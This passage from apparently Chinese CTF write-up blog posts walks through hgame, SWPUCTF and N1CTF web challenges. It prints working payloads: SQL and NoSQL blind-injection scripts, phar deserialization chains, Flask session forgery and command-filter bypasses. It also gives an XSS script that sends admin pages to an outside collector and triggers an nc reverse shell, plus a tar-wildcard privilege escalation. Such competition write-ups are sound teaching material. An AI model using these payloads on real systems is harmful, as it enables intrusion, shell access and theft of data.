fail');&#125;else&#123; echo $output;&#125; 可以看到，前四个step都可以用php黑魔法和数组绕过1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2 第五步可以看到要一个H_game，这个可以用点绕过下划线到了str5要求不是数字，大于9999999999同时(string)str5小于0，这个用数组绕过最后的parse_url利用它解析顺序的不同payload1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2&amp;H.game[]=1&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 然后拿到flag.php文件1234567891011121314&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__); 然后就是利用伪协议读文件了1str1=QNKCDZO&amp;str2=240610708&amp;str3[]=1&amp;str4[]=2&amp;H.game[]=1&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php PHP is the best language源码1234567891011121314151617181920212223242526&lt;?php include 'secret.php'; #echo $flag; #echo $secret; if (empty($_POST['gate']) || empty($_POST['key'])) &#123; highlight_file(__FILE__); exit; &#125; if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret); &#125; $gate = hash_hmac('sha256', $_POST['key'], $secret); if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit; &#125; if ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) &#123; echo \"Wow!!!\"; echo \"&lt;/br&gt;\"; echo $flag; &#125; else &#123; echo \"Hacker GetOut!!\"; &#125; 首先，sha256不能处理数组，所以我们可以先试下如果让他处理数组会怎样12345&lt;?php$secret = \"123456\";$data = array('1'=&gt;'1');$gate = hash_hmac('sha256',$data,$secret);var_dump($gate); 所以现在gate的值我们可以控制了，只剩下一个key值要满足md5($_POST[&#39;key&#39;])+1 == md5(md5($_POST[&#39;key&#39;]))+1，这个我们通过爆破可以找到一个12是可以满足这条式子的，所以最终payload1door[]=1&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf&amp;key=12 Baby_Spider这题要你在很短的时间里算出一些很长的式子，上脚本上脚本这道题有很短坑，要求加user-agent，到了中间字符又会被替换（0123456789 -&gt; 1026943587），最后还有去到css看真实的值12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# -*- coding: UTF-8 -*-import requestsimport reheader=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36\"&#125;token=&#123; 'token':'cUUHjtSX6xcnuG1HZQoaBi7rUq0WzoIJ'&#125;list='1026943587'url='http://111.231.140.29:10000/'url1='http://111.231.140.29:10000/question'url2='http://111.231.140.29:10000/solution'url3='http://111.231.140.29:10000/statics/style.css'res = '&lt;span&gt;(.*?)='r=requests.post(url=url,data=token)session=r.cookiesprint(\"[*] \"+\"-\"*40)for i in range(0,10): math = re.findall(res, r.content.decode('utf-8')) math = str(math)[2:len(math) - 3] print('[+] %s '% math) answer = eval(math) result = &#123; 'answer': answer &#125; print ('[+] %d '% answer) r=requests.post(url=url2,data=result,cookies=session,headers=header) session = r.cookies print(\"[*] \" + \"-\" * 40)tmp=''for i in range(10,20): math = re.findall(res, r.content.decode('utf-8')) math = str(math)[2:len(math) - 3] for j in math: if ord(j) &gt; 47: tmp += list[int(j)] else: tmp += j math = tmp tmp = '' print('[+] %s ' % math) answer = (eval(math)) result = &#123; 'answer': answer &#125; print ('[+] %d ' % answer) r = requests.post(url=url2, data=result, cookies=session, headers=header) session = r.cookies print(\"[*] \" + \"-\" * 40)res = 'content:\"(.*?)='for i in range(20,30): css = requests.get(url=url3, cookies=session, headers=header) math = re.findall(res, css.content.decode('utf-8')) math = str(math)[2:len(math) - 3] print('[+] %s ' % math) answer = (eval(math)) result = &#123; 'answer': answer &#125; print ('[+] %d ' % answer) r = requests.post(url=url2, data=result, cookies=session, headers=header) session=r.cookies print(\"[*] \" + \"-\" * 40) if \"hgame\" in r.content.decode('utf-8'): print(r.content.decode('utf-8')) Math有趣这里进去源码能看到一个图片的地址1&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt; 接着乱输发现会报错，顺便还把路径给爆出来了试着读一下文件1../../../../../../../../../../../../../etc/passwd base64加密一下过去居然能读到文件，现在我们就要去class读文件了123/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.classpayload:http://test.tan90.me:8080/img/L3Vzci9sb2NhbC90b21jYXQvd2ViYXBwcy9ST09UL1dFQi1JTkYvY2xhc3Nlcy9oZ2FtZS9jb250cm9sbGVyL01hdGhDb250cm9sbGVyLmNsYXNz 下下来一个class文件然后反编译一下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package hgame.controller;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.io.PrintStream;import java.util.Base64;import java.util.Base64.Decoder;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.stereotype.Controller;import org.springframework.ui.ModelMap;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class MathController&#123; @RequestMapping(value=&#123;\"/index\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String index(ModelMap model, HttpSession session, HttpServletResponse response) throws IOException &#123; Object step = session.getAttribute(\"step\"); if (step == null) &#123; session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); return null; &#125; if (step.toString().equals(\"1\")) &#123; model.addAttribute(\"message\", \"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?\"); &#125; else if (step.toString().equals(\"2\")) &#123; model.addAttribute(\"message\", \"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions.\"); &#125; return \"math\"; &#125; @RequestMapping(value=&#123;\"/index\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public void pindex(@RequestParam(\"answer\") String answer, HttpSession session, HttpServletResponse response) throws IOException &#123; Object step = session.getAttribute(\"step\"); if (step == null) &#123; session.setAttribute(\"step\", Character.valueOf('1')); response.sendRedirect(\"/index.php\"); &#125; else if ((step.toString().equals(\"1\")) &amp;&amp; (answer.equals(\"2\"))) &#123; session.setAttribute(\"step\", \"2\"); response.sendRedirect(\"/index.php\"); &#125; &#125; @RequestMapping(value=&#123;\"/img/&#123;path&#125;\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String image(@PathVariable(\"path\") String path, HttpServletResponse response) &#123; path = new String(Base64.getDecoder().decode(path)); InputStream f = null; OutputStream out = null; try &#123; f = new FileInputStream(\"/home/static/\" + path); out = response.getOutputStream(); int count = 0; byte[] buffer = new byte['���']; while ((count = f.read(buffer)) != -1) &#123; out.write(buffer, 0, count); out.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; try &#123; f.close(); out.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return \"ok\"; &#125; @RequestMapping(value=&#123;\"/flag\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;) public String Flag(ModelMap model) &#123; System.out.println(\"This is the last question.\"); System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\"); System.out.println(\"The flag is hgame&#123;x&#125;.x is a decimal number.\"); model.addAttribute(\"flag\", \"Flag is not here.\"); return \"flag\"; &#125;&#125; 所以只要找到一个满足123852^x % 612799081 = 6181254136845 % 612799081的x就行，最后爆破得到x是15387368，flag：hgame{15387368}","comments":true,"permalink":"https://xi4or0uji.github.io/2019/02/03/2019-hgame-week2/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018SWPUCTF","date":"2019-01-30T16:00:00.000Z","path":"2019/01/31/2018SWPUCTF/","text":"用优惠码 买个X？这题首先登陆进去会有一个15位优惠码，然后用它的时候又说，优惠码过期，要用24位的优惠码扫一下泄露扫出来个www.zip123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION['seed']=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie('Auth', $auth);&#125;//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 看到mt_srand很容易联想到是随机数安全问题，之前暨大校赛也考过根据wonderkun师傅的博客写脚本http://wonderkun.cc/index.html/?p=585这里有个神奇的地方就是15位爆不出来，减少位数反而能爆出种子123456789101112&lt;?php$str = \"MiFgJ3paOh6LjrY\";$rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$len = 15;for ($i=0;$i&lt;$len;$i++)&#123; if ($i&lt;=($len/2))&#123; $pos = strpos($rand,$str[$i]); echo $pos.\" \".$pos.\" \".\"0\".\" \".(strlen($rand)-1).\" \"; &#125; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]&#125; 然后跑出来是这个148 48 0 61 8 8 0 61 41 41 0 61 6 6 0 61 45 45 0 61 29 29 0 61 15 15 0 61 0 0 0 61 然后可以看到爆出来个种子然后按回题目的脚本获取长度为24的优惠码12345678910111213&lt;?php//生成优惠码 mt_srand(415048766); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=24; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; print $auth; 获得的优惠码是MiFgJ3pamT4pRrY9TZAteUZB，接下来就到命令执行了第一个正则可以用换行符%0a绕过，接下来到了第二个，因为他会匹配关键字，用到一些bypass技巧12345ip=127.0.0.1%0a`printf \"Y2F0IC9mbGFn\"|base64 -d`ip=127.0.0.1%0ac'a't /f'la'gip=127.0.0.1%0ac[a]t /f[l][a]gip=127.0.0.1%0atac /$(printf \"ZmxhZw==\"| base64 -d -)ip=127.0.0.1%0ac\\at /fl\\ag 然后就能拿到flag了 Injection???这题源码提示info.php，然后就能看到有mongodb扩展，没有mysql的扩展，大胆猜测是mongodb注入尝试一下admin登录进去，发现回显是username or password incorret，能确定username是admin，剩下的就是想办法获得password了这里先尝试一下check.php?username=admin&amp;password[$ne]=admin，发现会回显Nice! But it is not the real passwd，猜测应该是已经注入成功了，但是也将所有密码都返回回来，因此不能绕过，所以用正则去盲注1check.php?username=admin&amp;pasword[$regex]=^s 鉴于验证码不会识别，只能慢慢手动盲注出来……最后知道密码是skmun，登录就有flag了这里顺便挂一波4uuu Nya师傅的脚本，利用pytessercat去识别验证码，牛逼！123456789101112131415161718192021222324252627282930313233343536import pytesseractfrom PIL import Imageimport requestsimport osimport stringpassword = ''string_list = string.ascii_letters + string.digitss = requests.Session()for i in range(32): for j in string_list: res = s.get('http://123.206.213.66:45678/vertify.php') image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg') with open(image_name, 'wb') as file: file.write(res.content) image = Image.open(image_name) code = pytesseract.image_to_string(image) res = s.get('http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'+password + j +'&amp;vertify='+code) while ('CAPTCHA' in res.content): res = s.get('http://123.206.213.66:45678/vertify.php') image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg') with open(image_name, 'wb') as file: file.write(res.content) image = Image.open(image_name) code = pytesseract.image_to_string(image) res = s.get('http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'+password + j +'&amp;vertify='+code) print password+j,res.content if 'Nice!But it is not the real passwd' in res.content: password += j print password break elif 'username or password incorrect' in res.content: continueprint passwd 皇家线上赌场源码可以看见test.js和source访问/source可以看到框架和源码，猜测应该是读取文件源码/source的源码1234filename = request.args.get('file', 'test.js')if filename.find('..') != -1: return abort(403)filename = os.path.join('app/static', filename) 同时tips给了这部分源码12if filename != '/home/ctf/web/app/static/test.js' and filename.find('/home/ctf/web/app') != -1: return abort(404) 可以看到，它会将..去掉，然后再在static后面加文件名，利用点也就是在/static?file=那个地方了这里有个利用点，os.path.join函数的参数中，它会将绝对路径前面的所有参数给忽略掉通过maps文件/proc/self/maps可以读到web的路径试一下读/home/ctf/web_assli3fasdf/app/views.py读不到，这里有个小技巧，linux中/proc/self/cwd会返回当前工作目录的符号链接，然后这题的当前链接就是源码所在的目录，因此可以/static?file=/proc/self/cwd/app/views.py去读文件，然后就有源码了1234567891011121314151617181920212223242526272829303132#views.pydef register_views(app): @app.before_request def reset_account(): if request.path == '/signup' or request.path == '/login': return uname = username=session.get('username') u = User.query.filter_by(username=uname).first() if u: g.u = u g.flag = 'swpuctf&#123;xxxxxxxxxxxxxx&#125;' if uname == 'admin': return now = int(time()) if (now - u.ts &gt;= 600): u.balance = 10000 u.count = 0 u.ts = now u.save() session['balance'] = 10000 session['count'] = 0 @app.route('/getflag', methods=('POST',)) @login_required def getflag(): u = getattr(g, 'u') if not u or u.balance &lt; 1000000: return '&#123;\"s\": -1, \"msg\": \"error\"&#125;' field = request.form.get('field', 'username') mhash = hashlib.sha256(('swpu++&#123;0.' + field + '&#125;').encode('utf-8')).hexdigest() jdata = '&#123;&#123;\"&#123;0&#125;\":' + '\"&#123;1.' + field + '&#125;\", \"hash\": \"&#123;2&#125;\"&#125;&#125;' return jdata.format(field, g.u, mhash) /static?file=/proc/self/cwd/app/__init__.py把init的源码也给读了12345678910111213#__init__.pyfrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyfrom .views import register_viewsfrom .models import dbdef create_app(): app = Flask(__name__, static_folder='') app.secret_key = '9f516783b42730b7888008dd5c15fe66' app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db' register_views(app) db.init_app(app) return app 可以看到init.py里面连秘钥都给了，接下来就是session的伪造了先尝试解密又因为getflag函数里面要求balance要大于1000000，接下来进行伪造，这里有个坑点，题目是用python3写的，直接上工具加密不行12345678910from flask.sessions import SecureCookieSessionInterfaceclass App(object): secret_key = '9f516783b42730b7888008dd5c15fe66's = SecureCookieSessionInterface().get_signing_serializer(App())u = s.loads('.eJwVzDsSwyAMRdG9vNqFCP4Am8kIWRROImYAVxnvPc6tTnW_yPxmE0VydDdB6mkD6a_eynPUlxoSyJVZwqaZY1hJRXj1cwyu7PvDUy6ZluiZBBPOrs34cy9xcK-G6wctLh7_.XB7-2Q.d8W10pqlUI57tZthRyxwUddoIuQ')u['username'] = 'admin'u['balance'] = 100000000print(s.dumps(u)) 跑出来这个1.eJxFzDsOwyAQRdG9vNrFEPwBNhMNwyBZCYPkTxV570kq3-pU94PMbzZRJEd3A6SfdiD9tW_1efSXGhLI1VHCopljmElFePZjDK6W8vCUa6YpeibBgHPXzbj9zuDSVsP1BcPCID0.XFVvYg.WA0mcYbRg2pAOO-OzJe-Agg6dAM 这样我们就能伪造成admin登录进去了接下来就是格式化字符串漏洞了首先可以看到field这个可控点是拼在了g.u后面，因此需要向上跳1return jdata.format(field, g.u, mhash) 先找一下g的定义123456class AppContext(object): def __init__(self, app): self.app = app self.url_adapter = app.create_url_adapter(None) self.g = app.app_ctx_globals_class() self.refcnt = 0 先看一下当前的类1field=__class__ 可以看到我们现在的类是user，正常来说，我们应该先跳去db类，但是因为出题人给user类写了了一个save方法，我们可以先看一下这个方法有什么1field=__class__.save.__globals__ 可以看到有db，继续查看db有什么1field=__class__.save.__globals__[db].__class__.__init__.__globals__ 这里可以看到有current_app，有因为在前面register的current_app里面可以找到有g，所以可以直接调用出来1field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag SimplePHP这题进去可以找到两个可以利用的点，第一个是读文件，第二个是上传文件1234读文件http://120.79.158.180:11115/file.php?file=file.php上传文件http://120.79.158.180:11115/upload_file.php 先把一堆源码读出来file.php1234567891011121314151617&lt;?phpheader(\"content-type:text/html;charset=utf-8\"); include 'function.php';include 'class.php';$file = $_GET[\"file\"] ? $_GET['file'] : \"\";if(empty($file)) &#123; echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\";&#125;$show = new Show();if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show();&#125; else if (!empty($file))&#123; die('file doesn't exists.');&#125;?&gt; function.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php//show_source(__FILE__);include \"base.php\";header(\"Content-type: text/html;charset=utf-8\");error_reporting(E_ERROR | E_PARSE);foreach (array('_COOKIE','_POST','_GET') as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= addslashes($_value); &#125; &#125;function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;';&#125;function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125;&#125;function upload_file_check() &#123; global $_FILES; $allowed_types = array(\"gif\",\"jepg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) &#123; //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invild file!\");&lt;/script&gt;'; return false; &#125; &#125;&#125;?&gt; class.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|..|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(\"/http|https|file:|gopher|dict|../i\", $this-&gt;source)) &#123; echo \"hacker~\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 题目提示了flag在f1ag.php里面，同时也可以看到file.php有这样一句12345$show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; 接下来去看_show()方法12345678public function _show()&#123; if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125;&#125; 可以看到这里直接将f1ag过滤了，所以想直接读文件是不可能的了继续寻找可以看到Test类有个读文件的file_get()方法12345public function file_get($value)&#123; $text = base64_encode(file_get_contents($value)); return $text;&#125; 然后继续找调用了file_get()方法的方法123456789public function get($key)&#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value);&#125; 再继续找掉用get()方法的方法1234public function __get($key)&#123; return $this-&gt;get($key);&#125; 然鹅这个方法要在调用不存在的属性的时候才会触发，看回show类，可以看见12345public function __toString()&#123; $content = $this-&gt;str['str']-&gt;source; return $content;&#125; 所以只需要将str[‘str’]换成Test类就行，然鹅这个_toString()又要怎么触发呢，同时我们也知道这个方法要在输出对象的时候才会触发然后又看到在C1e4r里面有个这样的方法12345public function __destruct()&#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test;&#125; 这里就会将对象输出，至此，pop链完整了利用C1e4r类的_destruct()中的echo $this-&gt;test去触发Show中的_toString()，利用_toString()里面的$content = $this-&gt;str[‘str’]-&gt;source去触发Test类中的_get()，然后利用file_get()方法读文件接下来就是利用了exp如下123456789101112131415&lt;?phpinclude 'class.php';$a = new Test();$a-&gt;params = ['source'=&gt;'/var/www/html/f1ag.php'];$b = new Show('index.php');$b-&gt;str['str'] = $a;$c = new C1e4r($b);echo serialize($c);$ojb = unserialize('O:5:\"C1e4r\":2:&#123;s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:&#123;s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:&#123;s:3:\"str\";O:4:\"Test\":2:&#123;s:4:\"file\";N;s:6:\"params\";a:1:&#123;s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";&#125;&#125;&#125;&#125;&#125;');$phar = new Phar('hhh.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.php','test');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');$phar-&gt;setMetadata($ojb);$phar-&gt;stopBuffering(); 将hhh.phar改名成hhh.gif然后上传上去，又因为路径是这样的1$filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; 计算出路径然后访问1http://120.79.158.180:11115/file.php?file=phar://upload/xxx.jpg 就能拿到f1ag.php文件的源码了 有趣的邮箱注册首先在check.php发现源码1234567891011&lt;!--check.phpif($_POST['email']) &#123; $email = $_POST['email']; if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123; echo \"error email, please check your email\"; &#125;else&#123; echo \"等待管理员自动审核\"; echo $email; &#125;&#125;?&gt; 可以看到这里有个filter_var($email,FILTER_VALIDATE_EMAIL)，只需要引号括着就可以进行xss了，payload1\"&lt;script/src=http://xiaorouji.cn/youxiang.js&gt;&lt;/script&gt;\"@12.com 12345var a = new XMLHttpRequest();a.open('GET','http://localhost:6324/admin/admin.php',false);a.send(null);b = a.responseText;location.href = 'http://onsdtb.ceye.io/' + escape(b); 然后就会在自己的ceye上看到有1&lt;a href='admin/a0a.php?cmd=whoami'&gt; 这里可以看到a0a这个php下有一个命令执行的地方，尝试一下弹shell12345var a = new XMLHttpRequest();a.open('GET','http://localhost:6324/admin/a0a/php?cmd=nc+%2fbin%2fbash+vps_ip+port',false);a.send(null);b = a.responseText;location.href = 'http://onsdtb.ceye.io/' + escape(b); 成功弹了shell以后可以看到上一层的根目录下有个4f0a5ead5aef34138fcbf8cf00029e7b，访问一下看见进去这个目录可以看到一个backup.php，读一下他的源码12345678910111213&lt;?phpinclude(\"upload.php\");echo \"上传目录：\" . $upload_dir . \"&lt;br /&gt;\";$sys = \"tar -czf z.tar.gz *\";chdir($upload_dir);system($sys);if(file_exists('z.tar.gz'))&#123; echo \"上传目录下的所有文件备份成功!&lt;br /&gt;\"; echo \"备份文件名: z.tar.gz\";&#125;else&#123; echo \"未上传文件，无法备份！\";&#125;?&gt; 可以看到他会将上传过去的文件进行tar处理，接下来就是tar提权了具体参考这个https://www.freebuf.com/articles/system/176255.html我们需要上传三个文件123rouji.sh--checkpoint-action=exec=sh rouji.sh--checkpoint=1 rouji.sh的内容1cat /flag | base64 然后就能拿到flag了这场比赛质量真的是高，学到了学到了全文参考官方wp和一叶飘零师傅的wp","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/31/2018SWPUCTF/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 hgame week1","date":"2019-01-28T16:00:00.000Z","path":"2019/01/29/2019-hgame-week1/","text":"谁吃了我的flag这题题目的前半个flag提示了是泄露扫一下泄露可以扫出来.swp泄露，访问一下index.html.swp可以下载到一个文件，打开就能看到flag了 换头大作战跟着题目的要求全部换好就有flag了 very easy web源码1234567891011121314&lt;?phperror_reporting(0);include(\"flag.php\");if(strpos(\"vidar\",$_GET['id'])!==FALSE) die(\"&lt;p&gt;干巴爹&lt;/p&gt;\");$_GET['id'] = urldecode($_GET['id']);if($_GET['id'] === \"vidar\")&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 二次编码绕过就能有flag了1http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576idar can u find me?这题进去要你找到gate，查看源码看到f2.php跟过去看一下要你找到password可以在响应头看到有个password，同时又要求post方法给他，post过去以后就能看到有个链接，但是跳转的太快，只能抓包才能看清","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/29/2019-hgame-week1/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"n1ctf writeup","date":"2019-01-19T16:00:00.000Z","path":"2019/01/20/n1ctf-writeup/","text":"之前在学其他知识点的时候看到了这个比赛，顺便学一哈 77777这题的关键点在这一段代码上waf过滤了很多，但是like没有过滤，所以可以用like注入去获得password字段假如我们传过去的flag是123，hi是where (password like 0x25)查询语句就会变成1update users set points=123 where (password like 0x25) 这时分数变成了123，如果我们匹配一个错的字符分数会不变，因此就是like盲注，脚本如下12345678910111213141516171819202122232425import requestsimport stringimport urlliburl = \"http://47.97.168.223/index.php\"flag = \"\"true_flag = \"\"for i in range(1,1000): payload = flag for j in \"0123456789\"+string.letters+\"!@#$%^&amp;*()_+=&#123;&#125;~`\": data = &#123; 'flag':\"123\", \"hi\":urllib.unquote(\" where (password like 0x%s25)\"%(payload+hex(ord(j))[2:])) &#125; r = requests.post(url=url,data=data) if '123' in r.content: flag += hex(ord(j))[2:] true_flag += j print(true_flag) data1 = &#123; \"flag\":\"1\", \"hi\":\" where 1\" &#125; r = requests.post(url=url,data=data1) break 77777 2这一题也是注入，但是过滤了更加多的东西，like和非1的数字都被过滤了，剩下括号，加号和大于号。可以看到，因为(username &gt; “a”)为真，所以id=1+1=2，选出来的是id=2的用户的信息。回去题目update那里也可以用这样的方法判断pw是什么脚本123456789101112131415161718192021222324import requestsimport urlliburl = \"http://47.52.137.90:20000/index.php\"flag = \"\"for i in range(1,1000): for j in range(33,127): payload = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j))) data = &#123; \"flag\":\"123\", \"hi\":payload &#125; r = requests.post(url=url,data=data) if \"| 123&lt;br/&gt;\" in r.content: tmp = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j-1))) tmp_data = &#123; \"flag\":\"123\", \"hi\":tmp &#125; s = requests.post(url=url,data=tmp_data) if \"| 124&lt;br/&gt;\" in s.content: flag += chr(j-1) print(flag) break funning eating cms这题本来想把docker搭起来，但是中途不知道为什么一直出错，只能看着源码去学了。user.php有文件包含漏洞，可以读下源码1http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=index index.php123456789&lt;?phprequire_once \"function.php\";if(isset($_SESSION['login'] ))&#123; Header(\"Location: user.php?page=info\");&#125;else&#123; include \"templates/index.html\";&#125;?&gt; function.php（这个代码只贴关键的部分）12345678910111213141516171819202122232425262728&lt;?phpsession_start();require_once \"config.php\";function Hacker()&#123; Header(\"Location: hacker.php\"); die();&#125;function filter_directory()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125; 可以看到过滤了flag、manage、ffffllllaaaaggg这些关键字，但是可以看到赋值uri的时候用了parse_url，因此可以用斜杠绕过。1http://47.52.152.93:20000///user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg ffffllllaaaaggg.php1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;else &#123; echo \"you can find sth in m4aaannngggeee\";&#125;?&gt; m4aaannngggeee.php123456&lt;?phpif (FLAG_SIG != 